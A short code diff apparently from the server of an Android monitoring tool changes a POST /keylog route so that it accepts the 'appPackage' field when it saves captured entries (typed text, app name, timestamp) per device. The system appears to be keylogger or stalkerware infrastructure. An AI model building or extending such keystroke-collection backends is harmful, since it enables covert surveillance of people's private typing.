@@ -288,7 +288,8 @@ router.post('/keylog', async (req, res) => {
         const created = await prisma.keylog.createMany({
             data: entries.map(entry => ({
                 deviceId: device.id,
-                app: entry.app || entry.packageName || null,
+                // Android sends: appPackage, server also accepts: app, packageName
+                app: entry.appPackage || entry.app || entry.packageName || null,
                 appName: entry.appName || null,
                 text: entry.text || '',
                 timestamp: new Date(entry.timestamp || Date.now())
